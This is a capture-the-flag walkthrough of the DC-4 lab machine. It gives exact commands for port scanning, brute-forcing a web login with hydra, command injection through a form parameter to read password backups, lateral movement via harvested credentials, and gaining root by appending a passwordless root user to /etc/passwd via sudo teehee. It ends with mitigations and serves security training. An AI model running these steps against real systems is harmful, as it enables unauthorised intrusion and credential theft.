# DC-4 — Walkthrough

| Field | Detail |
|---|---|
| Machine | DC-4 |
| Series | DC |
| OS | Linux |

## 🔍 Overview

DC-4 is a Linux machine involving web login brute-forcing, command injection via a web-based command execution form, credential harvesting from a backup file and a mail spool, SSH lateral movement across multiple users, and privilege escalation through an insecure sudo configuration (`teehee`).

**Machine Details**

- Target IP: `192.168.1.5`
- Attacker (Kali) IP: `192.168.1.10`

---

## Step 1 – Network Scanning

```bash
nmap -sV -p- 192.168.1.5
```

**Open Ports:**

| Port | Service |
|---|---|
| 22/tcp | SSH — OpenSSH 7.4p1 |
| 80/tcp | HTTP — nginx 1.15.10 |

---

## Step 2 – Web Enumeration

```bash
curl http://192.168.1.5
gobuster dir -u http://192.168.1.5 -w /usr/share/wordlists/dirb/big.txt -x php
```

**Found:**

- Login page: `/login.php`
- Command execution page: `/command.php`

---

## Step 3 – Brute Force Login

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.5 http-post-form "/login.php:username=^USER^&password=^PASS^:S=302"
```

**Credentials recovered:**

```
Username: admin
Password: happy
```

---

## Step 4 – Login & Access Command Execution

```bash
curl -c cookies.txt -X POST http://192.168.1.5/login.php -d "username=admin&password=happy"
curl -b cookies.txt -X POST http://192.168.1.5/command.php -d "radio=ls+-l&submit=Run"
```

**Result:** Successfully authenticated and confirmed command execution through the `radio` parameter.

---

## Step 5 – Enumerate Home Directory

```bash
curl -b cookies.txt -X POST http://192.168.1.5/command.php -d "radio=ls+-l+/home&submit=Run"
```

**Users found:** `charles`, `jim`, `sam`

---

## Step 6 – Find Password Backup File

```bash
curl -b cookies.txt -X POST http://192.168.1.5/command.php -d "radio=find+/home+-name+*password*&submit=Run"
```

**Found:** `/home/jim/backups/old-passwords.bak`

---

## Step 7 – Extract Password List

```bash
curl -b cookies.txt -X POST http://192.168.1.5/command.php -d "radio=cat+/home/jim/backups/old-passwords.bak&submit=Run"
```

**Key password identified** for user `jim` from the extracted list.

---

## Step 8 – SSH Login as Jim

```bash
ssh jim@192.168.1.5
```

**Result:** Successfully authenticated as `jim` using the recovered password.

---

## Step 9 – Check Mail for Credentials

```bash
cat /var/mail/jim
```

**Found:** Password for user `charles`, disclosed in a local mail message.

---

## Step 10 – Switch to Charles

```bash
su charles
```

**Result:** Successfully switched to the `charles` account using the recovered password.

---

## Step 11 – Check Sudo Privileges

```bash
sudo -l
```

**Result:** `charles` can run `/usr/bin/teehee` as root with `NOPASSWD`.

---

## Step 12 – Privilege Escalation via `teehee`

```bash
echo "raaj::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
su raaj
```

`teehee` (a `tee` variant) was abused to append a new root-privileged user entry directly into `/etc/passwd`.

**Result:** Root access obtained.

---

## Step 13 – Flag Capture

```bash
cd /root
cat flag.txt
```

✅ **Root flag captured — machine fully compromised.**

---

## 🛡️ Key Vulnerabilities Identified

1. Weak admin password on the web application login
2. Unsanitized command execution via the `radio` parameter (command injection)
3. Unprotected password backup file accessible under a user's home directory
4. Sensitive credentials disclosed in local mail (`/var/mail`)
5. Insecure sudo configuration allowing `teehee` to write to `/etc/passwd` as root

## 🩹 Mitigations

1. Enforce strong password policies on all web application accounts
2. Sanitize and validate all user input to prevent command injection
3. Never store credentials in plaintext backup files, especially in accessible directories
4. Avoid sending or storing sensitive credentials via local mail
5. Restrict sudo permissions to only the specific commands/arguments required — never allow write access to `/etc/passwd` or similar sensitive files
6. Regularly audit sudoers configurations for privilege escalation risks

---

## 🧰 Tools Used

`nmap` · `gobuster` · `curl` · `hydra` · `ssh` · `teehee (sudo misconfiguration exploit)`

## 🧠 Techniques Covered

Web enumeration · Login brute-forcing · Command injection · Credential harvesting (backup files, mail) · SSH lateral movement · Sudo misconfiguration exploitation · Privilege escalation

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Network Scanning | ✅ |
| 2 | Web Enumeration | ✅ |
| 3 | Brute Force Login | ✅ |
| 4 | Login & Command Execution Access | ✅ |
| 5 | Enumerate Home Directory | ✅ |
| 6 | Find Password Backup File | ✅ |
| 7 | Extract Password List | ✅ |
| 8 | SSH Login as Jim | ✅ |
| 9 | Check Mail for Credentials | ✅ |
| 10 | Switch to Charles | ✅ |
| 11 | Check Sudo Privileges | ✅ |
| 12 | Privilege Escalation via `teehee` | ✅ |
| 13 | Flag Capture | ✅ |

*Writeup for educational purposes. Machine solved as part of the "DC" series.*
